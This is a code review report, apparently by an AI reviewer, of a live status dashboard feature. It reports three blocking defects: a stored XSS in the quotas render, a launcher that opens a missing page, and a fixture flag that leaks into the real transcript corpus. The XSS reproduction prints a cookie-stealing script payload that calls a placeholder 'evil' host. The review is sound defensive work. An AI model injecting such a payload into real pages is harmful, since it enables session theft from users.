# Code Review — CHANGE-0127 / spec-live-status-dashboard

```yaml
review:
  scope: git diff origin/main...HEAD (feat/live-status-dashboard @ 23e4339, 12 commits, 24 files)
  spec: docs/specs/SPEC-DRAFT-spec-live-status-dashboard.md (frozen, 12 Spec-AC, 29-row Test Plan)
  spec_compliance:
    verdict: fail
    ac_walk:
      - { ac: Spec-AC-01, call: compliant,
          citation: "generate-live-status.mjs:567-569 (pathToFileURL isMain); TEST-001/002/003/028 green under my own wrapper run" }
      - { ac: Spec-AC-02, call: compliant,
          citation: "generate-live-status.mjs:172-206 accumulate(); TEST-004/005/006/029 green" }
      - { ac: Spec-AC-03, call: compliant,
          citation: "generate-live-status.mjs:134-154; TEST-007/008 green; my real-corpus run cold 759/759 read 1.35s, warm 0.12s" }
      - { ac: Spec-AC-04, call: compliant,
          citation: "generate-live-status.mjs:354-363 + :441 na(); TEST-009/010 green" }
      - { ac: Spec-AC-05, call: compliant,
          citation: "live-parsers/*.mjs roots(); TEST-020 green, TEST-023 (test-ps1-quality.sh) exit 0. See BLOCKING-3 — the --home fixture override is not airtight, but the AC text (homedir/env + path.join + twins + per-OS message) holds" }
      - { ac: Spec-AC-06, call: compliant,
          citation: "generate-live-status.mjs:232-263; TEST-011/012/013/014 green. See NB-4 for the shape-drift render" }
      - { ac: Spec-AC-07, call: compliant,
          citation: "generate-live-status.mjs:267-304; TEST-015 green" }
      - { ac: Spec-AC-08, call: compliant,
          citation: "TEST-016/017 green; docs/product/live-status-dashboard.md:83-95 install+uninstall" }
      - { ac: Spec-AC-09, call: non-compliant,
          citation: "aai-live.sh:47-55 / aai-live.ps1:38-45 — under --watch the launcher opens docs/ai/live-status.html after a --data-only warm-up that never writes it (reproduced, BLOCKING-2). TEST-024/025/027 do not cover the launcher's open target" }
      - { ac: Spec-AC-10, call: non-compliant,
          citation: "generate-live-status.mjs:434 — the page's 'no external or network reference' clause is falsifiable: a Codex rate_limits payload rendered through na() injected a live <script>fetch('http://evil/...')</script> into the page (reproduced, BLOCKING-1). TEST-018 only greps a benign fixture" }
      - { ac: Spec-AC-11, call: compliant,
          citation: "TEST-019 green; my own real-corpus cold+warm run then `git status --porcelain` = 0 lines" }
      - { ac: Spec-AC-12, call: compliant,
          citation: "PROFILES.yaml extended +10 paths, exactly one suite-map `aai-live-status` row; TEST-021/022 suites green" }
  code_quality:
    verdict: fail
    findings:
      - { rank: BLOCKING, file: .aai/scripts/generate-live-status.mjs, line: 434,
          issue: "The session-quotas render branch interpolates foreign session-file data through na() (no HTML escaping) while every sibling branch uses esc(). used_percent / window_minutes / resets_at come straight out of a harness JSONL file.",
          failure_scenario: "A ~/.codex/sessions/**/rollout-*.jsonl line whose payload.rate_limits.primary.resets_at is \"...\\\"><script>fetch('http://evil/'+document.cookie)</script>\" renders verbatim into docs/ai/live-status.html. Opening the page executes the script and makes an outbound request from a page the spec guarantees is self-contained and network-free (Spec-AC-10). Reproduced end-to-end." }
      - { rank: BLOCKING, file: .aai/scripts/aai-live.sh, line: 50,
          issue: "The --watch warm-up runs the generator with --data-only, which by definition does NOT write live-status.html, then immediately hands that path to the platform opener. aai-live.ps1:39 is the identical twin. The inline comment (\"so there is something to open immediately\") states the opposite of what the code does.",
          failure_scenario: "Fresh clone (outputs are gitignored, so this is every new install): `bash .aai/scripts/aai-live.sh --watch` -> opener receives a nonexistent file. Reproduced with an instrumented AAI_LIVE_OPENER: run 1 logs `OPENER: MISSING .../docs/ai/live-status.html`, run 2 logs EXISTS. The browser shows a file-not-found page and never recovers, because the meta-refresh lives in the page that was never written." }
      - { rank: BLOCKING, file: .aai/scripts/generate-live-status.mjs, line: 313,
          issue: "--home injects HOME/USERPROFILE into the parser env but leaves the harnesses' own env overrides (CLAUDE_CONFIG_DIR, CODEX_HOME, GEMINI_HOME) in place, and each parser prefers its override over HOME. The documented fixture flag therefore does not isolate.",
          failure_scenario: "On any machine that exports CLAUDE_CONFIG_DIR (a documented Claude Code variable), `--home <empty fixture>` silently reads the real corpus: reproduced -> root /Users/ales/.claude/projects, 715 files, 21 sessions, from a fixture home containing nothing. The suite header's claim that \"the real ~/.claude, ~/.codex, ~/.gemini ... are NEVER touched\" is false there, TEST-002/004/005 go red for environmental reasons, and a test run parses the user's private 485 MB transcript corpus." }
      - { rank: NON-BLOCKING, file: .aai/scripts/generate-live-status.mjs, line: 144,
          issue: "The incremental cache is never pruned: entries are added per read file and only ever overwritten, never evicted, so paths that no longer exist persist forever. It also stores the full raw records array (validator O6 / N3, 19 MB) including the per-record `model` field, which no renderer or model field ever consumes.",
          failure_scenario: "Reproduced: 2-file corpus -> 2 cache keys; delete one file, re-run -> still 2 keys, the deleted path retained. Codex writes one rollout file per session, so on a long-lived machine the cache accumulates a record set for every session ever seen and is re-parsed + re-serialized on every run, including every --watch tick." }
      - { rank: NON-BLOCKING, file: .aai/scripts/live-parsers/claude-code.mjs, line: 59,
          issue: "`try { raw = fs.readFileSync(...) } catch { return; }` (identically codex.mjs:66, gemini-cli.mjs:38) swallows every read failure with no ctx.notes entry, so an unreadable or mid-scan-deleted session file vanishes from the totals with nothing named. The spec's parser contract says a skipped FILE is \"skipped and named\".",
          failure_scenario: "Reproduced: a chmod-000 session file that is the harness's only file yields `notes: []`, `degraded: []`, `usage_today: 0` — a fabricated-looking verified zero, the exact failure mode the spec sells against. Same shape for the discover()->parse() race when the harness rotates a file mid-scan." }
      - { rank: NON-BLOCKING, file: .aai/scripts/generate-live-status.mjs, line: 506,
          issue: "The SKIP section renders `degraded` and the quotas skip, but never `m.notes`. Malformed-line notes exist only in the data JSON.",
          failure_scenario: "A corrupted transcript produces N malformed-line notes; the human-facing page shows a lower-than-real spend with no visible indication that lines were dropped. `notes` is also unbounded — one entry per bad line." }
      - { rank: NON-BLOCKING, file: .aai/scripts/generate-live-status.mjs, line: 428,
          issue: "The tap-quotas branch treats a truthy rate_limits.five_hour as the documented object shape without validating it, then prints String(fh.used_percent).",
          failure_scenario: "Reproduced with a spooled payload carrying `\"five_hour\": \"90%\"`: the page renders `undefined%` with an empty resets cell instead of N/A or the AC-06 SKIP. RR-1 and the product doc both promise that a shape mismatch \"degrades to its tested SKIP path rather than lying\" — a wrong-key payload does, a wrong-value-shape payload does not." }
      - { rank: NON-BLOCKING, file: .aai/scripts/generate-live-status.mjs, line: 75,
          issue: "isToday() compares date strings while within7d() additionally requires `t <= nowMs`, so a future-dated record is counted in today and excluded from 7d.",
          failure_scenario: "Reproduced: one record at 2026-08-08T23:00Z with --now 2026-08-08T01:00Z -> usage_today: 100, usage_7d: 0. Clock skew on any machine writing transcripts (or an early-UTC-morning run) makes the page internally inconsistent: today > 7d." }
      - { rank: NON-BLOCKING, file: .aai/scripts/generate-live-status.mjs, line: 351,
          issue: "Validator O1, my call: NON-BLOCKING but real. A record with ts: null matches neither isToday nor within7d, so it silently contributes 0 with no note — the accumulate() fix now selects the right ts-less record and then drops it from every bucket.",
          failure_scenario: "The upstream-drift shape RR-3 names: a Codex build that stops writing top-level timestamps reports usage_today: 0 with notes: [] and degraded: [] — indistinguishable from a genuine idle day. Same family as the read-failure finding above; both want a named note." }
      - { rank: NON-BLOCKING, file: .aai/scripts/generate-live-status.mjs, line: 194,
          issue: "Validator O2, my call: NON-BLOCKING. The ts-less fallback branch fires when EITHER side lacks a ts, so an untimestamped record unconditionally overrides a known-later timestamped one.",
          failure_scenario: "Partial format drift (some token_count events keep their timestamp, some lose it): accumulate() over [{usage:500, ts:'...09:00Z'}, {usage:50, ts:null}] returns [50], under-reporting the session. `if (r.ts && !prev.ts) keep prev` is strictly safer and does not disturb TEST-029." }
      - { rank: NON-BLOCKING, file: .aai/scripts/generate-live-status.mjs, line: 542,
          issue: "Watch mode's tick wraps runOnce in a bare `catch {}` with no stderr output, so a persistent failure (unwritable output dir, corrupt cache) makes the sidecar loop forever writing nothing while the page silently serves stale data.",
          failure_scenario: "chmod -w docs/ai during a --watch session: every subsequent tick throws and is discarded; the operator sees a page that stopped updating with no diagnostic anywhere." }
      - { rank: NON-BLOCKING, file: .aai/templates/hooks/live-status-hooks.json, line: 4,
          issue: "The opt-in overlay wires only `bash .../live-spool.sh`; live-spool.ps1 is never referenced by any install artifact, and the product doc's Install section documents only the bash overlay.",
          failure_scenario: "A Windows operator follows docs/product/live-status-dashboard.md:83-90, merges the overlay, and gets a statusLine that shells out to bash — the .ps1 twin the same doc advertises at line 98 has no documented install path. Twin drift also exists in behavior: a JSON *array* payload is rejected by live-spool.sh (Array.isArray guard) but accepted by live-spool.ps1, which appends a ts-only line." }
      - { rank: NON-BLOCKING, file: .aai/scripts/live-parsers/codex.mjs, line: 31,
          issue: "walk() + discover() are duplicated verbatim (18 lines) between codex.mjs and claude-code.mjs; both parsers also carry an identical roots()/project() shape.",
          failure_scenario: "A fix to the traversal (e.g. the symlink or read-failure handling above) has to be made twice and will be made once. Low urgency — the registry's one-module-per-harness isolation is a deliberate spec choice — but the shared walker is not harness-specific." }
      - { rank: NON-BLOCKING, file: docs/product/live-status-dashboard.md, line: 39,
          issue: "\"How to use it\" documents --data-only and --home but omits --no-cache, --cache, --spool-dir, --output and --now, all of which the generator accepts and two of which (--no-cache, --spool-dir) an operator plausibly needs.",
          failure_scenario: "An operator whose cache went stale or whose spool lives elsewhere has no documented escape hatch and reads the source to find one." }
  cannot_verify:
    - { claim: "The .ps1 twins behave correctly at runtime on Windows (launcher open, spool write, line cap).",
        closes_with: "A Windows CI job or a manual run capturing both twins end-to-end. Parse-level + PSScriptAnalyzer coverage (TEST-023) does not exercise behavior. Spec RR-2 already accepts this." }
    - { claim: "The real Claude Code statusline stdin payload carries rate_limits.five_hour/seven_day in the shape the tap branch expects.",
        closes_with: "One live statusLine install capturing a real payload. Spec RR-1 already accepts this; NB-4 narrows what the promised SKIP fallback actually covers." }
    - { claim: "The session-quotas branch renders real Codex rate limits correctly (the branch is only ever driven by synthetic fixtures).",
        closes_with: "A run against a Codex session captured while the account is quota-limited, with payload.rate_limits.primary present." }
    - { claim: "Practical long-horizon ceiling of the never-pruned cache. That it never prunes is verified; how large it becomes over months of Codex sessions is not.",
        closes_with: "A size sample from a machine that has run the generator for weeks, or the prune fix making the question moot." }
    - { claim: "The hooks overlay merges cleanly into a real .claude/settings.json and the Stop/Notification hooks actually fire.",
        closes_with: "An install-then-observe run; no test merges the overlay into a real settings file." }
    - { claim: "Upstream harness on-disk formats stay as observed (spec RR-3).",
        closes_with: "Nothing in this repo; the registry localizes the blast radius, which is the accepted mitigation." }
  process:
    verdict: pass-with-notes
  overall: fail
```

## Scope and method

- Diff scope: `git diff origin/main...HEAD` on `feat/live-status-dashboard` @ 23e4339
  (12 commits, 24 files, +2671/-6). Preflight: working tree clean;
  `docs/ai/STATE.yaml:303` has `worktree.user_decision: worktree`, so the skill's
  worktree policy selects `git diff <base>...HEAD` and `inline_review_scope` is not
  consulted. `git status --porcelain` empty before and after every probe below.
  Two stale STATE fields noted under the process verdict.
- Spec: `docs/specs/SPEC-DRAFT-spec-live-status-dashboard.md`, SPEC-FROZEN, 12
  Spec-AC, 29-row Test Plan, ceremony_level 2, strategy hybrid. No `Review-By`
  values, so the gate's Rules 3/4 do not fire.
- Both validation rounds read (091200Z FAIL, 093456Z PASS). I did not re-litigate
  B1/B2/N1-N5 — I confirmed they are dead by re-running the suites and spot-checking
  the two fixes, then spent the pass on surfaces validation does not cover:
  adversarial foreign input, resource lifecycle, launcher behavior, twin drift,
  API surface, docs-vs-behavior.
- Suites re-run by me through the wrapper, all exit 0:
  `test-aai-live-status.sh` (26 `PASS: TEST-*`), `test-aai-layer-profiles.sh`,
  `test-aai-hygiene-pack.sh`, `test-ps1-quality.sh`;
  `check-test-registration.mjs tests/skills` rc=0; `aai-reap-tests.sh` reaped: 0;
  `spec-lint.mjs --strategy hybrid` LINT PASS 0 findings;
  `docs-audit.mjs --gate spec-live-status-dashboard` GATE PASS.
- Every finding below was reproduced by execution, not read off the diff.

## Anti-gaming: coaching attempt recorded

`SKILL_CODE_REVIEW.prompt.md` binds the orchestrator not to "characterize expected
findings, pre-rate severity, or scope-exclude areas for the reviewer". The dispatch
prompt did all three: it enumerated the suspicion areas to look at (XSS in the
generated page, path traversal, ReDoS, spool files as attack surface, cache growth,
ps1/sh twin drift, export-surface hazard), instructed me not to re-litigate what
validation proved, and pre-rated the validator's O1/O2 as "non-blocking ... your
call whether either is BLOCKING". Recorded as required; I reviewed the full scope
anyway — including the spec, intake, analysis doc, governance rows and docs, none
of which the dispatch named — and formed my own severity calls. Two of the three
BLOCKING findings below (the launcher and the `--home` leak) are outside the
dispatch's list, which is the point of the rule.

The dispatch also authorized me to fix trivial BLOCKING findings myself. I declined:
the same prompt's ANTI-GAMING CONTRACT is marked binding and makes the reviewer
context read-only on implementation files, and self-fixing would make me the author
of the code I am certifying (maker != checker). All three fixes are one-liners with
a named RED probe each — they belong to Remediation, followed by a re-review.

## BLOCKING findings

### BLOCKING-1 — Unescaped foreign data in the quotas render: stored XSS + outbound network from the "zero-network" page

`.aai/scripts/generate-live-status.mjs:434`

```js
quotasHtml = `<p>Attributed to <b>${esc(harness)}</b> (server-authoritative, in-session): used ${na(p.used_percent)}%, window ${na(p.window_minutes)}m, resets at ${na(p.resets_at)}.</p>`;
```

`na()` is `v => (v == null ? 'N/A' : String(v))` — it does not escape. Every other
interpolation of foreign data in the file goes through `esc()`; this branch does
not, and `p` is `payload.rate_limits.primary` read verbatim from a harness JSONL
file. Session transcripts are foreign data by construction: written by another
process, containing server-supplied strings.

Reproduced (fixture `~/.codex/sessions/2026/08/08/rollout-a.jsonl` with a hostile
`resets_at` and `used_percent`):

```
$ node generate-live-status.mjs --home <fixture> --now 2026-08-08T10:00:00Z --no-cache
- docs/ai/live-status.html
$ grep -n "Attributed to" docs/ai/live-status.html
41:<p>Attributed to <b>codex</b> (server-authoritative, in-session): used 50<script>alert('XSS')</script>%,
   window 300m, resets at 2026-08-08T14:00:00Z"><script>fetch('http://evil/'+document.cookie)</script>.</p>
```

The control in the same run: `project` (also foreign, from `payload.cwd`) renders
correctly escaped as `&lt;img src=q onerror=alert(1)&gt;` — so the defect is
localized to this one branch, not a systemic escaping failure.

Why BLOCKING:
- It breaks Spec-AC-10's named observable ("no external or network reference") with
  input the generator is designed to consume. The injected payload issues a real
  outbound `fetch` from a page whose entire selling point is zero-network.
- TEST-018 asserts the invariant only against a benign fixture, and its guard is
  `grep -qi "<script "` — with a trailing space, so it would not even catch
  `<script>`.
- The page is opened from `file://` by `aai-live.sh`, i.e. the injected script runs
  with local-file privileges in the operator's browser.

Fix: `esc()` all three values in that branch (an escaping `naEsc` helper keeps the
N/A semantics). RED first: a codex fixture with `<script>` in `resets_at`, asserting
`grep -c '<script' page == 0` and that the escaped `&lt;script&gt;` text is present.

### BLOCKING-2 — `aai-live.sh --watch` / `aai-live.ps1 --watch` open a page that does not exist

`.aai/scripts/aai-live.sh:47-55` (twin: `.aai/scripts/aai-live.ps1:38-45`)

```bash
if is_watch "$@"; then
  # Warm one-shot generate first so there is something to open immediately,
  node "$GEN" --data-only >/dev/null 2>&1 || true      # <- writes ONLY the JSON
  "$OPENER" "$REPO_ROOT/docs/ai/live-status.html" ...  # <- opens the HTML
```

`--data-only` is precisely the flag that suppresses the HTML, so the warm-up
guarantees the opposite of what its comment claims. Because both outputs are
gitignored (Spec-AC-11), the HTML is absent in every fresh checkout, which makes
this the default first-run experience of the feature's headline command.

Reproduced with an instrumented opener (`AAI_LIVE_OPENER`) in a scratch repo:

```
run 1 (fresh):     OPENER: MISSING .../docs/ai/live-status.html
run 2 (html now on disk): OPENER: EXISTS  .../docs/ai/live-status.html
```

The browser lands on a file-not-found page and cannot recover on its own: the
`<meta http-equiv="refresh">` that would reload it lives inside the page that was
never written. Spec-AC-09 requires the launcher twins to "generate then open the
page"; under `--watch` they do not. TEST-024/025/027 cover one-shot output, SIGINT
and opener refusal — none of them asserts that the opened path exists.

Fix: drop `--data-only` from the warm-up in both twins (one token each). RED first:
run `aai-live.sh --watch` in a scratch repo with a stub `AAI_LIVE_OPENER` that
records whether its argument exists, and assert EXISTS on the first run.

### BLOCKING-3 — `--home` does not isolate: harness env overrides win, so fixtures silently read the real corpus

`.aai/scripts/generate-live-status.mjs:312-313`

```js
const homeOverride = args.home ? path.resolve(ROOT, args.home) : null;
const env = { ...process.env, ...(homeOverride ? { HOME: homeOverride, USERPROFILE: homeOverride } : {}) };
```

`process.env` is spread in wholesale, and each parser prefers the harness's own
override over `HOME`:
`claude-code.mjs:22` (`CLAUDE_CONFIG_DIR`), `codex.mjs:27` (`CODEX_HOME`),
`gemini-cli.mjs:16` (`GEMINI_HOME`). So `--home` is silently defeated by an
environment variable the harnesses themselves document.

Reproduced with an empty fixture home:

```
$ CLAUDE_CONFIG_DIR="$HOME/.claude" node generate-live-status.mjs --home <empty fixture> --no-cache
root: /Users/ales/.claude/projects
sessions_total: 21   files_total: 715
```

Consequences, all real:
- `tests/skills/test-aai-live-status.sh:12-15` states "the real ~/.claude, ~/.codex,
  ~/.gemini ... are NEVER touched". On any machine exporting one of those three
  variables that claim is false, and the whole ride's evidence rests on that suite.
- TEST-002 (expects exactly 3 ABSENT), TEST-004 and TEST-005 assert exact totals;
  they go red for environmental reasons on such a machine — the same class of
  environment-dependent suite failure as validation's own N5.
- A test run parses the operator's private ~485 MB transcript corpus as a side
  effect.
- `docs/product/live-status-dashboard.md:39-40` documents `--home <dir>` as
  "overrides the resolved home directory"; it does not.

Fix: when `args.home` is set, build the parser env with the three harness overrides
deleted (`delete env.CLAUDE_CONFIG_DIR` etc.), so `--home` means what it says. RED
first: the reproduction above as a test — `CLAUDE_CONFIG_DIR=<other dir>` plus
`--home <empty fixture>` must still report claude-code ABSENT.

## Non-blocking findings and their dispositions (H6)

Each carries the recommended disposition; the ORCHESTRATOR records it (decisions.jsonl
entry or follow-up ref) — as a read-only reviewer I file neither.

| # | Finding (file:line) | Disposition |
|---|---|---|
| NB-1 | Cache never prunes vanished paths; stores raw records incl. the never-rendered `model` field (19 MB) — `generate-live-status.mjs:144` | remediate-in-tree (rebuild the cache object from the discovered file set each run; drop `model` or reduce to aggregates) |
| NB-2 | Read failures skipped with no note -> fabricated-looking verified zero — `claude-code.mjs:59`, `codex.mjs:66`, `gemini-cli.mjs:38` | remediate-in-tree (push a `notes` entry; it is the spec's own "skipped and named" rule) |
| NB-3 | `m.notes` never rendered in the SKIP section; unbounded — `generate-live-status.mjs:506` | remediate-in-tree (render a capped count + first N) |
| NB-4 | Shape-drifted tap payload renders `undefined%` instead of N/A/SKIP — `generate-live-status.mjs:428` | remediate-in-tree (validate the object shape before taking the tap branch) |
| NB-5 | Future-dated record counts in today but not 7d (today > 7d) — `generate-live-status.mjs:75` | remediate-in-tree (one-line: apply the same `t <= nowMs` guard) |
| NB-6 | Watch tick's bare `catch {}` swallows persistent failures silently — `generate-live-status.mjs:542` | remediate-in-tree (log to stderr, keep looping) |
| NB-7 | Validator O1 — ts-less records bucket to a silent 0 — `generate-live-status.mjs:351`. My call: NON-BLOCKING (no live impact, not a regression), but it is the same honesty gap as NB-2 | remediate-in-tree, together with NB-2 |
| NB-8 | Validator O2 — a ts-less record overrides a ts-bearing one — `generate-live-status.mjs:194`. My call: NON-BLOCKING (deterministic, no live impact) | remediate-in-tree (`if (r.ts && !prev.ts) keep prev`; TEST-029 stays green) |
| NB-9 | Hooks overlay wires only `live-spool.sh`; no documented Windows install path; array-payload behavior differs between the twins — `live-status-hooks.json:3-6`, `live-spool.ps1:31` | remediate-in-tree for the doc line; promote-to-follow-up-ref for a `.ps1` overlay variant |
| NB-10 | `walk()`/`discover()` duplicated verbatim across two parsers — `codex.mjs:31`, `claude-code.mjs:26` | promote-to-follow-up-ref (deliberate isolation; revisit if a third file-walking parser lands) |
| NB-11 | Product doc omits `--no-cache`, `--cache`, `--spool-dir`, `--output`, `--now` — `docs/product/live-status-dashboard.md:39` | remediate-in-tree (one bullet) |
| NB-12 | Traceability (validator O3): TEST-021/022/023 have no literal id in their named suites and `TEST-022` collides with the unrelated `test_022_pr_review_companions`. Substance verified independently (10/10 `.aai` paths classified once; one suite-map row; ps1 glob covers both twins) | promote-to-follow-up-ref (repo-wide test-id namespacing, not this scope's defect) |

## INFO (never gates)

- `runOnce`'s `JSON.stringify(model, (k, v) => v instanceof Map ? undefined : v, 2)`
  replacer is unreachable: the returned model contains no Map (the Map-bearing
  `harnessResults` entries are projected away at `generate-live-status.mjs:401-408`).
  Harmless, but it reads as a live guard.
- `isToday(ts, nowMs, nowDay)` ignores its `nowMs` parameter.
- Importing `generate-live-status.mjs` as a library fires `main()` whenever
  `process.argv[1]` happens to resolve to the module's own path — which is exactly
  what `node -e '...' "$GEN"` does. TEST-029 works around it with `GEN_MODULE_PATH`
  and documents why in an accurate comment. The idiom matches
  `generate-dashboard.mjs:370` and the export set (`buildModel`, `renderHtml`,
  `parseArgs`, `accumulate`) matches the siblings, so this is a repo-wide property,
  not a defect of this scope. Flag parsing is consistent with
  `generate-factory-report.mjs` token-for-token.
- Registry contract claim checked and it holds: nothing in `generate-live-status.mjs`
  branches on a harness id; adding a harness is one module + one import + one array
  entry, provided it reuses an existing accumulation mode. A NEW mode would require
  a generator change — worth saying out loud in the parser-contract section.
- Adversarial probes that PASSED: symlinked directories and symlinked `.jsonl` files
  are not followed by `walk()` (dirent `isDirectory()`/`isFile()` are false for
  symlinks), so no traversal escape and no directory cycle; no regex in the generator
  or any parser is applied to foreign input except the four linear `esc()` replaces
  (no ReDoS surface); the whole real 759-file corpus renders an 18 KB page (57 live
  sessions, 62 spend rows) in 1.35 s cold / 0.12 s warm; `project`, `sessionId` and
  `state` are all correctly escaped; `notes: 0` and `degraded: []` on the real corpus
  are genuine.

## Deviations from the frozen spec

1. Implementation plan says the cache is keyed `path -> {mtimeMs, size, aggregates}`;
   it stores `records` (`generate-live-status.mjs:144`). Reasonable — incremental
   re-render needs the records — and the product doc was honestly updated to match
   (line 55) rather than repeating the spec's wording. Named, not blocking.
2. Spec-AC-09's launcher clause is not met under `--watch` (BLOCKING-2).
3. Spec-AC-10's "no external or network reference" clause is falsifiable (BLOCKING-1).
4. Intake-vs-spec narrowings the frozen spec absorbed, listed for the audit trail:
   intake AC-001 asked for spend "per project/model/harness" — the spec's Spec-AC-10
   dropped `model`, and the implementation parses `model` into every record (and into
   the cache) without ever rendering it; intake AC-004 asked for install/uninstall
   "documented in USER_GUIDE", the spec moved it to the product doc and the USER_GUIDE
   rollup carries only the blurb plus a link. Both are Planning's call at freeze and
   were made explicitly; no action beyond noting them.

## Process verdict — pass with notes

Strong: RED-proof discipline is real (three `product_red` logs for the remediation
tests, all stored under `docs/ai/tdd/` and independently reproduced by the validator
against 93f817b); maker != checker held across implementation, validation and this
review; the governance quartet (PROFILES, suite-map, RUNTIME_IGNORE, DOCS_AI_CANON)
plus `.gitignore` were wired in the same ride rather than deferred; commits are
conventional and cleanly staged by surface; the spec's Test Plan was updated with
TEST-028/029 rather than quietly widening an existing row; the validation FAIL round
did its job and its two blockers are genuinely dead.

Notes:
- The dispatch's coaching violation, recorded above.
- CHANGELOG/commit message says the suite is "29/29"; the new suite emits 26 and
  three rows live in sibling suites (validator O4). Cosmetic but it is an evidence
  claim.
- `docs/INDEX.md` is a timestamp-only regeneration inside a feature commit
  (validator O5); the PR step's staged-vs-scope audit should expect it.
- Two stale STATE fields carried over from the earlier `core-prompt-diet` ride and
  were never refreshed for this scope: `worktree.branch: feat/core-prompt-diet`
  (STATE.yaml:305) and an `inline_review_scope` listing that ride's files
  (STATE.yaml:307-308). Inert here because `user_decision` is `worktree`, but a
  future reviewer who honored `inline` would review the wrong file list. Separately,
  `code_review.base_ref` (STATE.yaml:316) is `feat/live-status-dashboard` — the
  branch under review, i.e. an empty diff if taken literally; it should be
  `origin/main`. Both are orchestrator-owned fields.
- Three of the four adversarial classes that produced BLOCKING findings here
  (foreign-input escaping, launcher first-run, fixture isolation) are behaviors no
  Spec-AC names as an observable. The spec's Seam analysis is otherwise unusually
  good; a "hostile input" seam alongside SEAM 1-5 would have caught BLOCKING-1 at
  freeze.

## Next steps

1. Remediation fixes BLOCKING-1, -2, -3 RED-first (each has a named RED probe above),
   stores the RED logs under `docs/ai/tdd/`, and adds the three tests to the spec's
   Test Plan as TEST-030..032 with their Spec-AC mapping (01/09/10 or 05).
2. Orchestrator records a disposition per NON-BLOCKING row in the table above.
3. Re-review (same single pass) once the suites are green again; overall cannot flip
   to pass while any BLOCKING stands.
4. `code_review.status: fail` in STATE — written by the orchestrator, not by this
   subagent (SUBAGENT_CONTRACT single-writer rule).
